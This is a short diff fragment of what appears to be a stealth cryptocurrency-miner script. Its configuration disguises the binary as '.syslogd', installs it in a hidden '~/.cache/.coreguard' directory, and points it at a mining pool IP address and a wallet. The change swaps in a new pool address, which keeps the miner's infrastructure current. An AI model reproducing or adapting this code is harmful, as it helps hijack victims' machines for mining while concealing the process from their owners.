@@ -10,7 +10,7 @@ ALIAS_BIN = ".syslogd"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.coreguard")
 BIN_PATH = os.path.join(HIDDEN_DIR, ALIAS_BIN)
 
-POOL = "stratum+tcp://138.68.97.213:443"
+POOL = "stratum+tcp://104.248.171.56:443"
 WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Ricut"
 PASSWORD = "x"
 COOLDOWN_DURATION = 180
